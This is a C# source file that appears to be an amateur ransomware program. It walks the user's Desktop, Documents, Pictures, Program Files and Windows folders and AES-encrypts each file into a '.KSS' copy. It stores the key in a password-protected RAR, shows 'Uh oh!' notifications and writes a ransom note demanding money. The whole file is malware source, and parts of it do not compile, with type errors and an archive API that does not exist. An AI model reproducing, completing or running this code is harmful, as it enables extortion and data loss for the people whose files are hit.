using System;
using System.IO;
using System.Security.Cryptography;
using SharpCompress.Archives;
using SharpCompress.Common;
using Windows.UI.Notifications;
using Microsoft.Toolkit.Uwp.Notifications;

internal class Program
{
    private static void Main(string[] args)
    {
        string directoryPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        string java9 = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        string rory8 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
        string nurnik3 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        string ano4 = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        string lisa8 = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments);
        string larone9 = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
      
        string[] files = Directory.GetFiles(directoryPath);
        string[] java77 = Directory.GetFiles(java9);
        string[] rory5 = Directory.GetFiles(rory8);
        string[] nurik4 = Directory.GetFiles(nurnik3);
        string[] ana77 = Directory.GetFiles(ano4);
        string[] lisa3 = Directory.GetFiles(lisa8);
        string[] laurane2 = Directory.GetFiles(larone9);

        // Alternatively, you can get only certain files by using a search pattern
        // For example, to get only files with a ".txt" extension:
        // string[] files = Directory.GetFiles(directoryPath, "*.txt");

        List<string> fileList = new List<string>();

        foreach (string file in files)
        {
            fileList.Add(file);
                    ToastContent toastContent = new ToastContentBuilder()
                        .AddText("Uh oh!")
                        .GetToastContent();
                    
                    ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
        }
        foreach (string file in java77)
        {
            fileList.Add(file);
                    ToastContent toastContent = new ToastContentBuilder()
                        .AddText("Uh oh!")
                        .GetToastContent();
                    
                    ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
        }
        foreach (string file in rory5)
        {
            fileList.Add(file);
                    ToastContent toastContent = new ToastContentBuilder()
                        .AddText("Uh oh!")
                        .GetToastContent();
                    
                    ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
        }
        foreach (string file in nurik4)
        {
            fileList.Add(file);
                    ToastContent toastContent = new ToastContentBuilder()
                        .AddText("Uh oh!")
                        .GetToastContent();
                    
                    ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
        }
        foreach (string file in ana77)
        {
            fileList.Add(file);
                    ToastContent toastContent = new ToastContentBuilder()
                        .AddText("Uh oh!")
                        .GetToastContent();
                    
                    ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
        }
        foreach (string file in lisa3)
        {
            fileList.Add(file);
                    ToastContent toastContent = new ToastContentBuilder()
                        .AddText("Uh oh!")
                        .GetToastContent();
                    
                    ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
        }
        foreach (string file in laurane2)
        {
            fileList.Add(file);
                    ToastContent toastContent = new ToastContentBuilder()
                        .AddText("Uh oh!")
                        .GetToastContent();
                    
                    ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));
        }
      
        foreach (string file in fileList)
        {
            string dir = fileList;

            byte[] key = new byte[32];
            byte[] iv = new byte[16];
            using (var rng = new RNGCryptoServiceProvider())
            {
                rng.GetBytes(key);
                rng.GetBytes(iv);
            }

            using (var aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;

                using (var inputFile = File.OpenRead(file))
                using (var outputFile = File.Create(file + ".KSS"))
                {
                    using (var encryptor = aes.CreateEncryptor())
                    {
                        using (var cryptoStream = new CryptoStream(outputFile, encryptor, CryptoStreamMode.Write))
                        {
                            inputFile.CopyTo(cryptoStream);
                        }
                    }
                }
            }

            using (var keyFile = File.Create(Path.Combine(dir, "key.bin")))
            {
                string keyPath = Path.Combine(dir, "key.bin");
                keyFile.Write(key, 0, key.Length);
                keyFile.Write(iv, 0, iv.Length);
                string passwordPath = Path.Combine(dir, "lauren7.bin");
                string password = File.ReadAllText(passwordPath).Trim();
                using (var archive = ArchiveFactory.Create(ArchiveType.Rar, Path.Combine(dir, "encrypted.rar"), new RarWriterOptions { Password = password }))
                {
                    archive.AddEntry("key.bin", File.OpenRead(keyPath), true);
                    
                    ToastContent toastContent = new ToastContentBuilder()
                        .AddText("Oh no! D:")
                        .GetToastContent();
                    
                    ToastNotificationManagerCompat.CreateToastNotifier().Show(new ToastNotification(toastContent.GetXml()));

                    string filePath = Path.Combine(directoryPath, "myfiles.LSE.txt");
                    File.WriteAllText(filePath, "oh no! you have to send your money to: [PLACEHOLDER] or you'll lose your files :(");
                }
            }
        }
    }
}
